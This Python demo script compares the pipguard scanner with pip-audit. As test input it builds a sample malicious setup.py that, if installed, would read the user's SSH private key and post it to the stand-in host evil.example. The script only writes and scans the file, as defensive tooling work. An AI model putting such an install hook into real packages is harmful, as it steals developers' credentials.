#!/usr/bin/env python3
"""Reproducible head-to-head: pipguard vs pip-audit on an install-hook attack.

Demonstrates the capability difference behind docs/comparison.md — pip-audit
audits dependency *versions* against a CVE database and cannot inspect what a
package's code does, so a zero-day install-hook attack (no advisory yet) sails
through; pipguard flags the behaviour before install.

Runs offline for the pipguard half. The pip-audit half is best-effort: if
pip-audit isn't installed it's skipped with a note.
"""

from __future__ import annotations

import os
import subprocess
import sys
import tempfile

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from pipguard.models import RiskLevel
from pipguard.scanner import scan_python_file

MALICIOUS_SETUP = (
    "from setuptools import setup\n"
    "import os, urllib.request\n"
    "# install-time credential exfiltration (the litellm-class attack)\n"
    "key = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
    "urllib.request.urlopen('https://evil.example/collect', data=key.encode())\n"
    "setup(name='evilpkg', version='1.0.0')\n"
)


def _run_pipguard(setup_path: str) -> bool:
    findings = scan_python_file(setup_path, is_hook=True)
    blocked = any(f.level == RiskLevel.CRITICAL for f in findings)
    print("pipguard:")
    if blocked:
        for f in findings:
            if f.level == RiskLevel.CRITICAL:
                print(f"  [CRITICAL] {f.description}")
        print("  → would BLOCK install (exit 1)")
    else:
        print("  no CRITICAL finding")
    return blocked


def _run_pip_audit(pkg_dir: str) -> None:
    print("\npip-audit:")
    from shutil import which
    if which("pip-audit") is None:
        print("  (pip-audit not installed — `pip install pip-audit` to run this half)")
        return
    proc = subprocess.run(
        ["pip-audit", pkg_dir],
        capture_output=True, text=True, timeout=60,
    )
    out = (proc.stdout + proc.stderr).strip()
    print("  " + out.replace("\n", "\n  "))
    print("  → pip-audit audits *versions* against a CVE DB; it cannot scan "
          "setup.py behaviour, so this attack is invisible to it.")


def main() -> int:
    work = tempfile.mkdtemp(prefix="pipguard-compare-")
    pkg = os.path.join(work, "evilpkg")
    os.makedirs(pkg)
    setup_path = os.path.join(pkg, "setup.py")
    with open(setup_path, "w", encoding="utf-8") as f:
        f.write(MALICIOUS_SETUP)
    # A valid project file so pip-audit ingests the package and *runs* — the
    # point is that it runs cleanly while blind to the setup.py attack.
    with open(os.path.join(pkg, "pyproject.toml"), "w", encoding="utf-8") as f:
        f.write("[project]\nname = 'evilpkg'\nversion = '1.0.0'\n")

    print("=" * 64)
    print("Head-to-head on a zero-day install-hook attack (evilpkg/setup.py)")
    print("=" * 64)
    blocked = _run_pipguard(setup_path)
    _run_pip_audit(pkg)

    print("\n" + "-" * 64)
    print("Verdict: pipguard caught the behavioural attack that a CVE-database"
          " tool structurally cannot see.")
    return 0 if blocked else 1


if __name__ == "__main__":
    sys.exit(main())
